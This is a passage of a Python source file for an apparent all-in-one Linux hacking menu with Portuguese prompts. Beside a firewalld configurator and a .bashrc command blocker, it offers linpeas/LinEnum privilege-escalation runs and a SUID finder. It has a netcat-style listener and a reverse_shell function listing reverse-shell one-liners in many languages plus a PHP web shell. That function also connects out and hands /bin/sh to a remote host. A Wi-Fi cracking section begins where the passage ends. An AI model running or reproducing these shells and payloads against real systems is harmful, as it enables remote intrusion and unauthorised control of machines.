                    user = input('Digite o usuário: ')
                    dir = f'/home/{user}/.bashrc' ###############################
                    var = '${comandos[@]}'
                    os.system('sudo mv block /usr/share/block')
                    os.system(f'''echo 'comandos=($(cat /usr/share/block))' | sudo tee -a {dir} > /dev/null''')
                    os.system(f'''echo 'for comando in "{var}"; do' | sudo tee -a {dir} > /dev/null''')
                    os.system(f'''echo '  alias "$comando"="echo '\''Comando bloqueado'\''"' | sudo tee -a {dir} > /dev/null''')
                    os.system(f'''echo 'done' | sudo tee -a {dir} > /dev/null''')
                    print("Arquivo modificado com sucesso!")
                    input("Pressione Enter para continuar...")
                    main()
                else:
                    input("Pressione Enter para continuar...")
                    main()

        elif opcao == 4:
            print('''
Você deseja configurar Servidor ou Client?

\033[0;34m[1]\033[m Servidor  \033[0;34m[2]\033[m Client \033[0;34m[0]\033[m Voltar
            ''')
            sit_ssh = int(input('Escolha uma opção: '))
            if sit_ssh == 1:
                print()
            elif sit_ssh == 2:
                pass
            elif sit_ssh == 0:
                main()
            else:
                print('Digite uma opção válida!')
                input(press)

        elif opcao == 5:
            pass
        elif opcao == 6:
            pass
        elif opcao == 7:
            pass
        elif opcao == 8:
            pass
        elif opcao == 9:
            pass
        elif opcao == 10:
            pass
        elif opcao == 0:
            print('Volte sempre! ¯\_(ツ)_/¯')
            quit()
        elif opcao > 10:
            print('Digite uma opção válida!')
            input(press)

    except ValueError:
        print('Digite uma opção válida!')
        input(press)
    except NameError:
        print('Digite uma opção válida!')
        input(press)



    '''os.system('sudo ip addr show')
    print('\n')
    ip = input('Qual IP gostaria de atribuir a este Computador?\n')
    gateway = input('Digite o Gateway: ')
    dns = input('Digite o nameserver + ip (Ex"nameserver 8.8.8.8"):  ')
    #Definir um endereço IP estático:
    os.system(f'sudo ip addr add {ip}/24 dev eth0')
    #Configurar o gateway padrão:
    os.system(f'sudo ip route add default via {gateway}')
    #Adicionar um servidor DNS:
    os.system(f'echo "{dns}" | sudo tee /etc/resolv.conf')'''


#=======================================================================================
def linpeas():
    try:
        sit_linpeas = input('Esta opção pode demorar por muito tempo. Deseja continuar? (S/N) ')
        t.sleep(0.25)
        if(sit_linpeas.lower() == "s"):
            os.system('chmod +x linpeas.sh')
            os.system('./linpeas.sh')
        else:
            input(press)
            main()
        pass
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)


#=======================================================================================
def linenum():
    try:
        sit_linenum = input('Esta opção pode demorar por muito tempo. Deseja continuar? (S/N) ')
        t.sleep(0.25)
        if(sit_linenum.lower() == "s"):
            os.system('chmod +x LinEnum.sh')
            os.system('./LinEnum.sh')
        else:
            input(press)
            main()
        pass
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)



#=======================================================================================
####################################################################
## FUNÇÃO QUE CRIA UM CONFIGURADOR DE FIREWALL COM "firewall-cmd" ##
####################################################################
def waza():
    wversion = '\033[7;32mv2.1dev\033[m'
    
    #############################################################
    ## VERIFICA A DISTRO LINUX, INSTALA E HABILITA O FIREWALLD ##
    #############################################################
    def verifica_distro_e_firewall():
        with open("/etc/os-release", "r") as arquivo: 
            
            for linha in arquivo:
            
                if linha.startswith("ID="):
                    distro_id = linha.split("=")[1].strip().strip('"')
        
        ##############################
        ## DISTROS A SER VERIFICADA ##
        ##############################
        if distro_id in ["ubuntu", "oracle", "rhel"]:
            status = os.system("sudo systemctl status firewalld >/dev/null 2>&1")
        
            if status == 0:
                print("Firewalld está instalado e em execução.")
        
            else:
                intalar_firewalld = input(f"O firewalld não está instalado. Deseja instalar o firewalld no {distro_id}? (S/N): ").lower()
            
                if intalar_firewalld == "s":
                    package_manager = "apt" if distro_id == "ubuntu" else "yum"

                    #############################################
                    ## INSTALA, INICIA, E HABILITA O FIREWALLD ##
                    #############################################
                    os.system(f"sudo {package_manager} install firewalld -y")
                    os.system("sudo systemctl start firewalld")
                    os.system("sudo systemctl enable firewalld")
                    print("Firewalld instalado e iniciado com sucesso.")
            
                else:
                    print("Firewalld não instalado. Instale manualmente e tente novamente!")
    
        else:
            print("Distribuição não suportada.")
            main()

    #######################################
    ## FUNÇÃO PARA CONFIGURAR O FIREWALL ##
    #######################################
    verifica_distro_e_firewall()

    ##############################################################
    ## DEFINE UMA SEQUENCIA DE VARIÁVEIS PARA INTERAÇÃO DO MENU ##
    ############################################################## 
    seleciona_interface = None
    seleciona_zonas_str = None
    selected_services_str = None
    block_selected_services_str = None
    selected_ports_str = None
    block_selected_ports_str = None
    port_list = None
    press = '(Pressione qualquer tecla para voltar ao menu inicial)'
    
    os.system('clear')

    try:
        while True:
            ###########################
            ## BANNER PRA FICAR COOL ##
            ###########################
            print(f'''\033[1;91m
        .DL               ;W,      ,##############Wf.     ;W,
f.     :K#L     LWL      j##,       ........jW##Wt       j##,
EW:   ;W##L   .E#f      G###,             tW##Kt        G###,
E#t  t#KE#L  ,W#;     :E####,           tW##E;        :E####,
E#t f#D.L#L t#K:     ;W#DG##,         tW##E;         ;W#DG##,
E#jG#f  L#LL#G      j###DW##,      .fW##D,          j###DW##,
E###;   L###j      G##i,,G##,    .f###D,           G##i,,G##,
E#K:    L#W;     :K#K:   L##,  .f####Gffffffff;  :K#K:   L##,
EG      LE.     ;##D.    L##, .fLLLLLLLLLLLLi   ;##D.    L##,
                                                    \033[m{wversion}''')
            
            print("Opções:\n")

            #######################################################
            ## LISTAGEM DE OPÇÕES PARA FACILITAR O USUÁRIO.      ##
            ## A LÓGICA É FAZER O USUÁRIO SELECIONAR A INTERFACE ##
            ## E A ZONA E DEPOIS PENSAR EM CONFIGURAR.           ##
            ##                                                   ##
            ## NESTE TRECHO TAMBÉM HÁ ALGUMAS CONDICIONAIS PARA  ##
            ## EXIBIR FEEDBACK DO QUE ESTÁ ACONTECENDO APOS O    ##
            ## USUÁRIO FAZER A SELEÇÃO DAS CONFIGURAÇÕES         ##
            #######################################################
            print(f"\033[0;34m[1]\033[m - Selecionar interface {'(Selecionado: ' + seleciona_interface + ')' if seleciona_interface else ''}")
        
            if seleciona_zonas_str:
                print(f"\033[0;34m[2]\033[m - Selecionar zona (Selecionado:  {seleciona_zonas_str})")
        
            else:
                print(f"\033[0;34m[2]\033[m - Selecionar zona")
        
            if selected_services_str:
                print(f"\033[0;34m[3]\033[m - Liberar serviços (Selecionados: {selected_services_str})")
        
            else:
                print("\033[0;34m[3]\033[m - Liberar serviços")            
        
            if selected_ports_str:
                print(f"\033[0;34m[4]\033[m - Liberar portas (Selecionados: {selected_ports_str})")
        
            else:
                print("\033[0;34m[4]\033[m - Liberar portas ")
        
            if block_selected_services_str:
                print(f"\033[0;34m[5]\033[m - Bloquear serviços (Selecionados: {block_selected_services_str})")
        
            else:
                print("\033[0;34m[5]\033[m - Bloquear serviços")            
        
            if block_selected_ports_str:
                print(f"\033[0;34m[6]\033[m - Bloquear portas (Selecionados: {block_selected_ports_str})")
        
            else:
                print("\033[0;34m[6]\033[m - Bloquear portas ") 
            print(f"\033[0;34m[7]\033[m - Remover interface da Zona")
            print(f"\033[0;34m[8]\033[m - Bloquear IP")
            print(f"\033[0;34m[9]\033[m - Bloquear IPs por Máscara")
            print(f'\033[0;34m[10]\033[m- Listar todas as Zonas')
            print(f"\033[0;34m[11]\033[m- Mostrar Configuração da Zona")
            print(f"\033[0;34m[12]\033[m- Listar IPs bloqueados")
            print("\033[0;34m[13]\033[m- Aplicar Configurações")
            print("\033[0;34m[0]\033[m - Sair")


            opcao = input("\nEscolha uma opção: ")

            ###########################################################
            ## EXIBE UM MENU PARA SELEÇÃO DAS INTERFACES DISPONÍVEIS ##
            ###########################################################
            if opcao == "1":
                interfaces = os.popen("ls /sys/class/net/").read().strip().split()
                print("Interfaces disponíveis:")
            
                for i, iface in enumerate(interfaces, start=1):
                    print(f"[{i}] {iface}")
            
                try:
                    print("[0] Voltar ao Menu")
                    interface_index = int(input("Escolha a interface (número): "))
                
                    if interface_index == 0:
                        seleciona_interface = None
                
                    elif 1 <= interface_index <= len(interfaces):
                        seleciona_interface = interfaces[interface_index - 1]
            
                except (ValueError, IndexError):
                    print("Escolha inválida.")

            ######################################################### 
            ## EXIBE UM MENU PARA SELEÇÃO DAS ZONAS DISPONÍVEIS    ##
            ## AQUI ELE PERMITE MULTISELEÇÃO DAS ZONAS DISPONÍVEIS ##
            #########################################################                  
            elif opcao == "2": 
                    zonas = os.popen("firewall-cmd --get-zones").read().strip().split()
                    print("Zonas disponíveis:")
                
                    for i, zone in enumerate(zonas, start=1):
                        print(f"[{i}] {zone}")
                
                    try:
                        print("[0] Voltar ao Menu")
                        seleciona_zonas = []
                    
                        while True:
                            zone_index = int(input("Escolha a zona (número): "))
                        
                            if zone_index == 0:
                                break
                        
                            elif 1 <= zone_index <= len(zonas):
                                seleciona_zona = zonas[zone_index - 1]
                                seleciona_zonas.append(seleciona_zona)  
                        
                            else:
                                print("Escolha inválida.")
                            seleciona_zonas_str = ', '.join(seleciona_zonas)
                
                    except (ValueError, IndexError):
                        print("Escolha inválida.")

            #########################################################
            ## EXIBE UM MENU PARA SELEÇÃO DOS SERVIÇOS DISPONÍVEIS ##
            ## AQUI ELE PERMITE MULTISELEÇÃO DOS SERVIÇOS          ##
            #########################################################                        
            elif opcao == "3": 
                if seleciona_zona and seleciona_interface:
                    services = os.popen("""firewall-cmd --get-services""").read().strip().split()
                    services = [service.strip() for service in services if service.strip()]
                    print("Escolha os Serviços:")
                
                    for i, service in enumerate(services, start=1):
                        print(f"[{i}] {service}")
                    try:
                        print("[0] Voltar ao Menu")
                        selected_services = []
                        
                        while True:
                            service_index = int(input("Escolha o serviço (número): "))
                        
                            if service_index == 0:
                                break
                        
                            elif 1 <= service_index <= len(services):
                                selected_service = services[service_index - 1]
                                selected_services.append(selected_service)
                            
                            else:
                                print("Escolha inválida.")
                        selected_services_str = ', '.join(selected_services)
                    
                    except (ValueError, IndexError):
                        print("Escolha inválida.")
            
                else:
                    print("Zona ou serviço não selecionado.")
        
            ###########################################################
            ## PEDE UMA ENTRADA DAS PORTAS QUE DESEJA PERMITIR.      ##
            ## AS PORTAS SÃO SEPARADAS POR "," E SENDO ENVIADAS PARA ##
            ## UMA LISTA QUE SERÁ CONFIGURADA MAIS PARA FRENTE       ##
            ###########################################################         
            elif opcao == "4":
                if seleciona_zona:
                    ports = input("Digite a(s) porta(s) desejada(s) separada(s) por vírgula: ")
                    port_list = ports.split(',')
                
                    for index, port in enumerate(port_list):
                        try:
                            port_list[index] = port.strip()
                        except ValueError:
                            print(f"Entrada inválida para a porta: {port}")
                    selected_ports_str = ', '.join(port_list)
                
                else:
                    print("Zona ou serviço não selecionado.")

            #########################################################
            ## EXIBE UM MENU PARA SELEÇÃO DOS SERVIÇOS DISPONÍVEIS ##
            ## AQUI ELE PERMITE MULTISELEÇÃO DOS SERVIÇOS          ##
            #########################################################              
            elif opcao == "5":
                if seleciona_zona:
                    block_services = os.popen("""firewall-cmd --get-services""").read().strip().split()
                    block_services = [block_service.strip() for block_service in block_services if block_service.strip()]
                    print("Escolha os Serviços:")
                
                    for i, block_service in enumerate(block_services, start=1):
                        print(f"[{i}] {block_service}")
                    try:
                        print("[0] Voltar ao Menu")
                        block_selected_services = []
                    
                        while True:
                            block_service_index = int(input("Escolha o serviço (número): "))
                        
                            if block_service_index == 0:
                                break
                        
                            elif 1 <= block_service_index <= len(block_services):
                                block_selected_service = block_services[block_service_index - 1]
                                block_selected_services.append(block_selected_service)
                        
                            else:
                                print("Escolha inválida.")
                        block_selected_services_str = ', '.join(block_selected_services)
                
                    except (ValueError, IndexError):
                        print("Escolha inválida.")
            
                else:
                    print("Zona ou serviço não selecionado.")
            
            ##############################################################
            ## A OPÇÃO 6 SERÁ O PROCESSO INVERSO DA PERMISSÃO DE PORTAS ##
            ##############################################################
            elif opcao == '6':
                pass
            
            #################################################################
            ## PERMITE REMOVER DA ZONA SELECIONADA A INTERFACE SELECIONADA ##
            #################################################################
            elif opcao == "7": 
                if seleciona_zona and seleciona_interface:
                    sit_remove = input(f"Deseja remover a interface {seleciona_interface} da zona {seleciona_zona}. (S/N) ")
                    
                    if sit_remove.lower() == 's':
                        os.system(f"firewall-cmd --zone={seleciona_zona} --permanent --remove-interface={seleciona_interface}")
                        os.system("firewall-cmd --reload")
                        print(f"Interface {seleciona_interface}removida da zona {seleciona_zona}.")
            
                else:
                    print("Selecione a Interface a ser removida e a Zona a ser configurada.")

            ############################################################################
            ## PERMITE BLOQUEAR IP INDIVIDUALMENTE, AINDA NÃO TEM TRATAMENTO COM "RE" ##
            ############################################################################        
            elif opcao == "8":
                bloquear_ip = input("Digite o IP a ser bloqueado: ")
                os.system(f"firewall-cmd --permanent --zone={seleciona_zona} --add-rich-rule='rule family=ipv4 source address={bloquear_ip} drop'")
                print(f"IP {bloquear_ip} bloqueado.")
                input(press)

            ########################################
            ##   PERMITE BLOQUEAR A FAIXA DE IP   ##
            ########################################
            elif opcao == "9":
                ip_mask = input("Digite a faixa de IP a ser bloqueado: ")
                os.system(f"firewall-cmd --permanent --zone={seleciona_zona} --add-rich-rule='rule family=ipv4 source address={ip_mask} drop'")
                print(f"Range de IPs {ip_mask} bloqueado.")
                input(press)

            ##########################
            ## LISTA TODAS AS ZONAS ##
            ##########################
            elif opcao == "10":
                os.system('firewall-cmd --list-all-zones')
                input(press)

            ##############################################
            ## LISTA A CONFIGURAÇÃO DA ZONA SELECIONADA ##
            ##############################################
            elif opcao == "11":
                try:
                    os.system(f'firewall-cmd --zone={seleciona_zona} --list-all')
                    input(press)
                except UnboundLocalError:
                    print('Selecione uma zona.')
                    input(press)
            
            #############################
            ## LISTA OS IPS BLOQUEADOS ##
            #############################
            elif opcao == "12":
                os.system('sudo iptables -L -n')
                input(press)

            ##################################################################################################
            ## A MAGICA ACONTECE AQUI! AQUI ESTÁ A CONFIGURAÇÃO FINAL DE TUDO QUE FOI SELECIONADO NO SCRIPT ##
            ##################################################################################################    
            ## ESTA OPÇÃO CONFIRMA AS ALTERAÇÕES SELECIONADAS, E FAZ ABRE POSSIBILIDADE DE NOVOS AJUSTES ##
            ###############################################################################################
            elif opcao == "13":
                try:
                    ########################################################
                    ## FAZ A ALTERAÇÃO DA INTERFACE PARA ZONA SELECIONADA ##
                    ########################################################
                    if seleciona_zona and seleciona_interface:
                        cfg_iface = os.popen(f"firewall-cmd --zone={seleciona_zona} --change-interface={seleciona_interface} --permanent").read()
                        print(f'Configuração da INTERFACE e ZONA: {cfg_iface}')
                        
                        ##############################################################
                        ## SE O SERVIÇO ESTIVER SELECIONADO, ELE FAZ A CONFIGURAÇÃO ##
                        ##############################################################
                        if selected_services_str != None:
                            selected_services_list = selected_services_str.split(', ')
                        
                            for service in selected_services_list:
                                cfg_service = os.popen(f"firewall-cmd --add-service={service} --permanent --zone={seleciona_zona}").read()
                                print(f'Permissão do serviço {service}: {cfg_service}')
                        
                        ############################################################
                        ## SE A PORTA ESTIVER SELECIONADA, ELE FAZ A CONFIGURAÇÃO ##
                        ############################################################
                        if selected_ports_str != None:
                            selected_ports_str = selected_ports_str.split(',')
                        
                            for port in selected_ports_str:
                                
                                if port != 0 or port != '':
                                    tcp_port = os.popen(f"firewall-cmd --add-port={port}/tcp --permanent --zone={seleciona_zona}").read()
                                    print(f'Porta {port}/tcp liberada: {tcp_port}')
                                    udp_port = os.popen(f"firewall-cmd --add-port={port}/udp --permanent --zone={seleciona_zona}").read()
                                    print(f'Porta {port}/udp liberada: {udp_port}')
                        
                        ##########################################################################
                        ## SE O BLOQUEIO DE SERVIÇO ESTIVER SELECIONADO, ELE FAZ A CONFIGURAÇÃO ##
                        ##########################################################################
                        if block_selected_services_str != None:
                            block_selected_services_list = block_selected_services_str.split(', ')
                            
                            for block_service in block_selected_services_list:
                                block_cfg_service = os.popen(f"firewall-cmd --remove-service={block_service} --permanent --zone={seleciona_zona}").read()
                                print(f'Bloqueio do serviço {block_service}: {block_cfg_service}')
                    
                        ##########################################################################
                        ## SE O BLOQUEIO DE SERVIÇO ESTIVER SELECIONADO, ELE FAZ A CONFIGURAÇÃO ##
                        ##########################################################################
                        '''
                        if block_selected_ports_str != None:
                            block_selected_ports_str = block_selected_ports_str.split(',')
                        
                            for block_port in block_selected_ports_str:
                                
                                if block_port != 0 or block_port != '':
                                    block_tcp_port = os.popen(f"firewall-cmd --remove-port={block_port}/tcp --permanent --zone={seleciona_zona}").read()
                                    print(f'Porta {block_port}/tcp bloqueada: {block_tcp_port}')
                                    block_udp_port = os.popen(f"firewall-cmd --remove-port={block_port}/udp --permanent --zone={seleciona_zona}").read()
                                    print(f'Porta {block_port}/udp bloqueada: {block_udp_port}')
                        '''
                        #########################################
                        ## ABRE O MENU DE CONFIGURAÇÕES EXTRAS ##
                        #########################################
                        try:
                            while True:
                                print("Configuração manual para a zona:")
                                print('[1] Defina o Target')
                                print("[2] Bloquear ICMP")
                                print("[3] Configurar PortForward")
                                print("[4] Configurar masquerade")
                                print("[0] Concluir")
                                choice = input("Escolha uma opção: ")
                                
                                #############################################
                                ## ABRE O MENU DE CONFIGURAÇÃO DE "TARGET" ##
                                #############################################
                                if choice == "1":
                                    print('[1] Default')
                                    print("[2] ACCEPT")
                                    print("[3] REJECT")
                                    print("[4] DROP")
                                    print("[0] Concluir")
                                    target = int(input('Escolha a opção do Target: '))
                                    
                                    if target == 1:
                                        os.system(f"firewall-cmd --zone={seleciona_zona} --set-target=default")
                                
                                    if target == 2:
                                        os.system(f"firewall-cmd --zone={seleciona_zona} --set-target=ACCEPT")
                                
                                    if target == 3:
                                        os.system(f"firewall-cmd --zone={seleciona_zona} --set-target=REJECT")  
                                
                                    if target == 4:
                                        os.system(f"firewall-cmd --zone={seleciona_zona} --set-target=DROP")
                                
                                    if target == 0:
                                        pass
                                
                                    else:
                                        print('Digite uma opção válida')

                                #################################################
                                ## ABRE O MENU DE CONFIGURAÇÃO DE "ICMP_BLOCK" ##
                                #################################################
                                if choice == "2":
                                    icmp_options = {
                                        "Echo-Request": "echo-request",
                                        "Echo-Reply": "echo-reply",
                                        "Destination Unreachable": "destination-unreachable",
                                        "Source Quench": "source-quench",
                                        "Redirect": "redirect",
                                        "Time Exceeded": "time-exceeded",
                                        "Parameter Problem": "parameter-problem",
                                        "Timestamp Request/Reply": "timestamp-request",
                                        "Address Mask Request/Reply": "address-mask-request",
                                        "Router Solicitation/Advertisement": "router-solicitation",
                                        "Traceroute": "traceroute"
                                    }
                                    print("\nOpções de bloqueio ICMP:")
                                    
                                    for num, option in enumerate(icmp_options.keys(), start=1):
                                        print(f"{num}. {option}")
                                
                                    try:
                                        option_num = int(input("Digite o número correspondente à opção de ICMP a ser bloqueada: "))
                                    
                                        if 1 <= option_num <= len(icmp_options):
                                            selected_icmp = list(icmp_options.keys())[option_num - 1]
                                            icmp_type = icmp_options[selected_icmp]
                                            os.system(f"firewall-cmd --zone={seleciona_zona} --add-icmp-block={icmp_type}")
                                            os.system("firewall-cmd --reload")
                                            print(f"Comando executado: firewall-cmd --zone={seleciona_zona} --add-icmp-block={icmp_type}")
                                            print(f"ICMP tipo '{selected_icmp}' bloqueado.")
                                    
                                        else:
                                            print("Número de opção inválido.")
                                    except ValueError:
                                        print("Entrada inválida. O número da opção deve ser um número inteiro.")
                            
                            ###############################################################################
                            ## CONFIGURA O PORTFORWARD, DIRECIONANDO O TRAFEGO DE UMA PORTA PARA A OUTRA ##
                            ###############################################################################
                                elif choice == "3":
                                    forward_sit = input("Deseja configurar o PortForward? (S/N) ")
                                    if forward_sit.lower() =='s':
                                        porta_entrada = int(input('Digite a porta de Entrada: '))
                                        porta_destino = int(input('Digite a porta de Destino: '))
                                        os.system(f"firewall-cmd --zone={seleciona_zona} --add-forward-port=port={porta_entrada}:proto=tcp:toport={porta_destino}")
                                        os.system('firewall-cmd --runtim-to-permanent')
                                        print(f"PortForward configurado ({porta_entrada} >> {porta_destino}).")
                                
                                    elif forward_sit.lower() =='n':
                                        os.system(f"firewall-cmd --zone={seleciona_zona} --remove-forward")
                                        print(f"PortForward removido.")
                                    os.system("firewall-cmd --reload")

                                elif choice == "4":
                                    masquerade_value = input("Deseja habilitar o Masquerade? (S/N) ")
                                    os.system(f"firewall-cmd --zone={seleciona_zona} --add-option=masquerade --value={masquerade_value}")
                                    os.system("firewall-cmd --reload")
                                    print(f"Comando executado: firewall-cmd --zone={seleciona_zona} --add-option=masquerade --value={masquerade_value}")
                                    print(f"Masquerade configurado para {masquerade_value}.")

                                elif choice == "0":
                                    break

                                else:
                                    print("Escolha inválida. Tente novamente.")

                        except KeyboardInterrupt:
                            print("\nPrograma encerrado.")
                            os.system('clear')
                        
                        os.system("firewall-cmd --reload")

                    else:
                        print("Zona ou serviço não selecionado.")

                except UnboundLocalError:
                    print("Zona ou serviço não selecionado.")

            elif opcao == "0":
                print("Até a próxima! (ツ)")
                break

            else:
                print("Opção inválida. Tente novamente.")
            os.system('clear')

    except KeyboardInterrupt:
        print("\nPrograma encerrado.")

#=======================================================================================
def suid():
    path = input('Digite o caminho a ser pesquisado: ')
    if (bool(path) == False):
        path = '/'
    print('Este processo pode demorar alguns segundos, aguarde ...\n')
    os.system(f'find {path} -perm -u=s -type f 2>/dev/null')
    input(press)
    main()


#=======================================================================================
def nc(porta):
    try:
        s.bind(("", porta))
        s.listen(1)
        print(f"Escutando na porta {porta}")
        conn, addr = s.accept()
        print('Conexão recebida de',addr[0])
        while True:
            ans = conn.recv(1024).decode()
            sys.stdout.write(ans)
            command = input()
            command += "\n"
            conn.send(command.encode())
            t.sleep(0.1)
            sys.stdout.write("\033[A" + ans.split("\n")[-1])
    except OSError:
        print('Esta PORTA está sendo utilizada.')
        porta = int(input("Digite a Porta: "))
        nc(porta)
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)

def reverse_shell():

    def display_reverse_shell_options(options):
        for idx, option in options.items():
            print(f'{idx}. {option["label"]}')
        print('')

    try:
        ip = input('Digite o IP: ')
        porta = int(input('Digite a Porta: '))

        options = {
            1: {"label": "|BASH|", "commands": ['sh -i >& /dev/tcp/{}/{} 0>&1'.format(ip, porta),
                                                '0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196'.format(ip, porta),
                                                'exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done'.format(ip, porta),
                                                'sh -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5',
                                                'sh -i >& /dev/udp/{}/{} 0>&1']},
            2: {"label": "|NETCAT|", "commands": ['rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f'.format(ip, porta),
                                                    'nc {} {} -e sh'.format(ip, porta)]},
            3: {"label": "|RUST|", "commands": ['rcat {} {} -r sh'.format(ip, porta)]},
            4: {"label": "|PERL|", "commands": [
                """perl -e 'use Socket;$i="SEUIP";$p=SUAPORTA;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'""",
                """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""".format(
                    ip, porta)]},
            5: {"label": "|PHP|", "commands": [
                """ <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?> """,
                """php -r '$sock=fsockopen("{}",{});exec("sh <&3 >&3 2>&3");'""".format(ip, porta),
                """php -r '$sock=fsockopen("{}",{});shell_exec("sh <&3 >&3 2>&3");'""".format(ip, porta)]},
            6: {"label": "|POWERSHELL|", "commands": [
                """powershell -e client = New-Object System.Net.Sockets.TCPClient("192.168.0.192",4545);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""",
            ]},
            7: {"label": "|PYTHON|", "commands": [
                """export RHOST="{}";export RPORT={};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'""".format(
                    ip, porta),
                """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""".format(
                    ip, porta)]},
            8: {"label": "|SOCAT|", "commands": [
                """socat TCP:{}:{} EXEC:sh""".format(ip, porta),
                """socat TCP:{}:{} EXEC:'sh',pty,stderr,setsid,sigint,sane""".format(ip, porta)]},
            9: {"label": "|NODE|", "commands": [
                """require('child_process').exec('nc -e sh {} {}')""".format(ip, porta)]},
            10: {"label": "|JAVASCRIPT|", "commands": [
                """String command = "var host = 'SEUIP';" +
                            "var port = SUAPORTA;" +
                            "var cmd = 'sh';"+
                            "var s = new java.net.Socket(host, port);" +
                            "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
                            "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
                            "var po = p.getOutputStream(), so = s.getOutputStream();"+
                            "print ('Connected');"+
                            "while (!s.isClosed()) {"+
                            "    while (pi.available() > 0)"+
                            "        so.write(pi.read());"+
                            "    while (pe.available() > 0)"+
                            "        so.write(pe.read());"+
                            "    while (si.available() > 0)"+
                            "        po.write(si.read());"+
                            "    so.flush();"+
                            "    po.flush();"+
                            "    java.lang.Thread.sleep(50);"+
                            "    try {"+
                            "        p.exitValue();"+
                            "        break;"+
                            "    }"+
                            "    catch (e) {"+
                            "    }"+
                            "}"+
                            "p.destroy();"+
                            "s.close();";
                String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
                ref.add(new StringRefAddr("x", x);"""]},
            11: {"label": "|TELNET|", "commands": [
                'TF=$(mktemp -u);mkfifo $TF && telnet {} {} 0<$TF | sh 1>$TF'.format(ip, porta)]},
            12: {"label": "|ZSH|", "commands": [
                """zsh -c 'zmodload zsh/net/tcp && ztcp {} {} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'""".format(
                    ip, porta)]},
            13: {"label": "|GOLANG|", "commands": [
                """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","SEUIP","SUAPORTA");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""]},
            0: {"label": "Voltar", "commands": []}
        }

        while True:
            print('''
Você deseja Pesquisar ou Executar?

\033[0;34m[1]\033[m Pesquisar  \033[0;34m[2]\033[m Executar \033[0;34m[0]\033[m Voltar
            ''')
            sit_rev = int(input('Escolha uma opção: '))

            if sit_rev == 1:
                display_reverse_shell_options(options)
                revsit = int(input('Escolha uma opção: '))

                if revsit in options:
                    print('')
                    print(options[revsit]["label"])
                    for command in options[revsit]["commands"]:
                        print(f'-\033[0;31m {command}\033[m')
                    print('')
                    input('Pressione Enter para continuar...')
                else:
                    print('Digite uma opção válida!')
            elif sit_rev == 2:
                try:
                    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, porta))
                    print('Conectado com Sucesso!')
                    comando = """python3 -c 'import pty;pty.spawn("/bin/bash")'"""
                    print(f"Sugestão de comando: {comando}")
                    os.dup2(s.fileno(), 0)
                    os.dup2(s.fileno(), 1)
                    os.dup2(s.fileno(), 2)
                    os.system("/bin/sh -i")
                except OSError:
                    print('\033[0;31mHost não alcançado\033[m')
            elif sit_rev == 0:
                input('Pressione Enter para voltar...')
                break
            else:
                print('Digite uma opção válida!')

    except ValueError:
        print('Digite uma opção válida!')
    except Exception as e:
        print(f'Erro: {e}')

#=======================================================================================
def server_tcp():
    try:
        file = open("ARQ/output.txt", "w")
        porta = int(input("Digite a Porta a ser escutada: "))
        try:
            s.bind(("0.0.0.0", porta))
            s.listen(5)
            print("Listening...")
            client_socket, address = s.accept()
            print(f"Received from: {address[0]}")
            data = client_socket.recv(1024).decode()
            file.write(data)
            s.close()
        except Exception as error:
            print("Erro: ", error)
            s.close()
    except FileNotFoundError:
        os.system(dir)
        server_tcp()


#=======================================================================================
def serverhttp():
    try:
        port = int(input('Qual porta será usada para o HTTP Server? '))
        server = hs.SimpleHTTPRequestHandler
        request = ss.TCPServer(("",port),server)
        print(f"Server HTTP \033[1;32m'ONLINE'\033[m na PORTA: \033[7;33m{port}\033[m\n")
        request.serve_forever()
    except OverflowError:
        print('\nDigite uma porta valida. (0 ~ 65535)')
        serverhttp()
    except ValueError:
        print('\nDigite uma porta valida. (0 ~ 65535)')
        serverhttp()
    except PermissionError:
        print('Se Deseja usar uma porta baixa, execute com SUDO.')
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)


#=======================================================================================
def wifi_hacking():
    ################################################
    ## FUNÇÃO PARA QUEBRAR SENHA DENTRO DE UM FOR ##
    ################################################
    def magic_crack():
        try:
            #######################
            #CONVERTE PARA HASHCAT#
            #######################
            os.system('hcxpcapngtool -o WifiCrack/hash.hc22000 -E essidlist dumpfile.pcapng')

            with open('WifiCrack/hash.hc22000','r') as f:
                dump = f.read()
            
        except FileNotFoundError:
